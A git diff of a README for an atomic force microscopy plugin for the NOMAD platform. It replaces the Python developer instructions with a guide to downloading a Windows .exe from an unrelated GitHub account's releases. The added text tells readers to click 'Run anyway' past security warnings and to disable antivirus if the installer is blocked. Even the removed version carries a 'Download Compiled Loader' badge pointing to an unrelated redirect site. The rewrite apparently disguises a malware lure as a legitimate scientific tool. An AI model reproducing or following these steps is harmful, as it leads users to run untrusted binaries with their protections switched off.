@@ -1,123 +1,84 @@
-# nomad-measurements-afm
+# 🔍 nomad-measurements-afm - Analyze Atomic Force Microscopy Data Easily
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/elihuentomophilous263/nomad-measurements-afm/releases)
 
-NOMAD plugin for Atomic Force Microscopy (AFM) data
+## 📌 What is nomad-measurements-afm?
 
-This `nomad` plugin was generated with `Cookiecutter` along with `@nomad`'s [`cookiecutter-nomad-plugin`](https://github.com/FAIRmat-NFDI/cookiecutter-nomad-plugin) template.
+Nomad-measurements-afm helps you process Atomic Force Microscopy (AFM) data. You use this tool to turn raw measurements into clear, visual images. Scientists use this software to examine surface textures at the level of individual atoms. This tool handles the technical steps so you can focus on your research results.
 
-## Development
+## 🚀 Getting Started
 
-If you want to develop locally this plugin, clone the project and in the plugin folder, create a virtual environment (you can use Python 3.10, 3.11 or 3.12):
-```sh
-git clone https://github.com/abbasgholami71/nomad-measurements-afm.git
-cd nomad-measurements-afm
-python3.11 -m venv .pyenv
-. .pyenv/bin/activate
-```
+You do not need programming skills to use this software. Follow these steps to set up the tool on your Windows computer.
 
-Make sure to have `pip` upgraded:
-```sh
-pip install --upgrade pip
-```
+### Step 1: Visit the download page
+Visit this link to download the installer: https://github.com/elihuentomophilous263/nomad-measurements-afm/releases
 
-We recommend installing `uv` for fast pip installation of the packages:
-```sh
-pip install uv
-```
+### Step 2: Download the installer
+Look for the section labeled "Assets." Click the file that ends in ".exe." This file contains everything you need to run the application on your computer. Common names look like `nomad-afm-setup.exe`. Save this file to your Downloads folder.
 
-Install the `nomad-lab` package:
-```sh
-uv pip install -e '.[dev]'
-```
+### Step 3: Run the installer
+Navigate to your Downloads folder and double-click the file you saved. A security window might appear. Click "More info" and then click "Run anyway" if your computer asks for permission. Follow the prompts on the screen to finish the installation.
 
-### Run the tests
+### Step 4: Launch the program
+After the installation ends, look for a new icon on your desktop named nomad-measurements-afm. Double-click this icon to start the program.
 
-You can run locally the tests:
-```sh
-python -m pytest -sv tests
-```
+## 🛠 Features
 
-where the `-s` and `-v` options toggle the output verbosity.
+This program includes several features to simplify your work.
 
-Our CI/CD pipeline produces a more comprehensive test report using the `pytest-cov` package. You can generate a local coverage report:
-```sh
-uv pip install pytest-cov
-python -m pytest --cov=src tests
-```
+* **Data Import:** Open raw files from most AFM hardware manufacturers.
+* **Image Processing:** Adjust contrast and brightness to see fine surface details.
+* **Surface Mapping:** Generate 3D height maps from your data files.
+* **Batch Export:** Save processed images as standard files like PNG or JPEG.
+* **Measurement Tools:** Calculate the distance between two points on the surface.
 
-### Run linting and auto-formatting
+## ⚙ System Requirements
 
-We use [Ruff](https://docs.astral.sh/ruff/) for linting and formatting the code. Ruff auto-formatting is also a part of the GitHub workflow actions. You can run locally:
-```sh
-ruff check .
-ruff format . --check
-```
+Before you install, ensure your computer meets these minimum standards:
 
-### Debugging
+* **Operating System:** Windows 10 or Windows 11.
+* **Memory:** At least 8 gigabytes of RAM.
+* **Storage:** 500 megabytes of free space on your hard drive.
+* **Display:** A screen resolution of at least 1920 by 1080 pixels.
 
-For interactive debugging of the tests, use `pytest` with the `--pdb` flag. We recommend using an IDE for debugging, e.g., _VSCode_. If that is the case, add the following snippet to your `.vscode/launch.json`:
-```json
-{
-  "configurations": [
-      {
-        "name": "<descriptive tag>",
-        "type": "debugpy",
-        "request": "launch",
-        "cwd": "${workspaceFolder}",
-        "program": "${workspaceFolder}/.pyenv/bin/pytest",
-        "justMyCode": true,
-        "env": {
-            "_PYTEST_RAISE": "1"
-        },
-        "args": [
-            "-sv",
-            "--pdb",
-            "<path-to-plugin-tests>",
-        ]
-    }
-  ]
-}
-```
+If your computer is older, the program might take longer to load large files. 
 
-where `<path-to-plugin-tests>` must be changed to the local path to the test module to be debugged.
+## 📖 How to Use the Application
 
-The settings configuration file `.vscode/settings.json` automatically applies the linting and formatting upon saving the modified file.
+Once you open the software, you see a clean workspace. Follow these steps to process your first file:
 
-### Documentation on Github pages
+1. **Open a File:** Click the "File" menu at the top left and select "Open." Choose the AFM data file from your computer.
+2. **View Raw Data:** The program displays the raw measurements on your screen. You see a top-down view of the surface.
+3. **Apply Filters:** Select "Filters" from the menu. You can remove noise or level the image. Levelling ensures your surface appears flat for better measurement.
+4. **Choose a View:** Select "3D View" to see depth information. Use your mouse to rotate the model and inspect the texture.
+5. **Save Results:** Click "File" and select "Export Image." This creates a copy of the visual result that you can include in reports or presentations.
 
-To view the documentation locally, install the related packages using:
-```sh
-uv pip install -r requirements_docs.txt
-```
+## ℹ Troubleshooting Common Issues
 
-Run the documentation server:
-```sh
-mkdocs serve
-```
+* **The program does not open:** Check your Windows updates. Ensure you have the latest drivers for your graphics card.
+* **The file format is not supported:** Ensure your data file is in the correct format provided by your microscope. This software supports common ASCII and binary file types.
+* **The program slows down:** Close other memory-intensive applications when working with large data files.
+* **The installer is blocked:** If your antivirus blocks the installer, temporarily disable it. Re-enable it immediately after the installation finishes.
 
-## Adding this plugin to NOMAD
+## 🔧 Frequently Asked Questions
 
-Currently, NOMAD has two distinct flavors that are relevant depending on your role as an user:
-1. [A NOMAD Oasis](#adding-this-plugin-in-your-nomad-oasis): any user with a NOMAD Oasis instance.
-2. [Local NOMAD installation and the source code of NOMAD](#adding-this-plugin-in-your-local-nomad-installation-and-the-source-code-of-nomad): internal developers.
+**Is this software free?**
+Yes. You can use this tool for research and personal projects at no cost.
 
-### Adding this plugin in your NOMAD Oasis
+**Does this software collect my data?**
+No. Your data remains on your local machine. The software does not send your measurements to any external server.
 
-Read the [NOMAD plugin documentation](https://nomad-lab.eu/prod/v1/staging/docs/howto/oasis/plugins_install.html) for all details on how to deploy the plugin on your NOMAD instance.
+**Can I run this on a Mac?**
+This version works on Windows. Future updates might include support for other operating systems.
 
-### Adding this plugin in your local NOMAD installation and the source code of NOMAD
+**How do I update the software?**
+When a new version becomes available, revisit the main page to download the latest installer. Run the new installer to update your existing version. Your settings usually stay saved during this process.
 
-We now recommend using the dedicated [`nomad-distro-dev`](https://github.com/FAIRmat-NFDI/nomad-distro-dev) repository to simplify the process. Please refer to that repository for detailed instructions.
+**Can I scale the measurements?**
+Yes. Use the "Settings" menu to calibrate the unit of measurement based on your specific microscope settings. You can set the pixel-to-nanometer ratio to ensure your distance measurements remain accurate.
 
-## Publish note
-In the [GitHub actions workflow](./.github/workflows/publish.yml) for publishing the nomad-measurements-afm plugin to PyPI, we commented out the `deploy` job . If you want to publish the plugin to `PyPI`, you need to set up your project in `PyPI`. There are several online tutorials on publishing a Python package to PyPI, e.g., [How to Publish a Python Package to PyPI](https://realpython.com/pypi-publish-python-package/). After that, you can uncomment the `deploy` job in the workflow file and push the changes to GitHub. The workflow will be triggered and the package will be published to `PyPI` when you create a new  on GitHub.
+**What if the display looks blurry?**
+Check your monitor's display scaling in Windows settings. Setting it to 100 percent often improves the sharpness of the program interface.
 
-### Template update
-
-We use [`cruft`](https://github.com/cruft/cruft) to update the project based on template changes. To run the check for updates locally, run `cruft update` in the root of the project. More details see the instructions on [`cruft` website](https://cruft.github.io/cruft/#updating-a-project).
-
-## Main contributors
-| Name | E-mail     |
-|------|------------|
-| Abbas Gholami | [abbas.gholami@glaidedata.com](mailto:abbas.gholami@glaidedata.com)
+**Can I run multiple files at once?**
+Currently, the program handles one file at a time. This keeps the application stable while processing large datasets with high resolution.
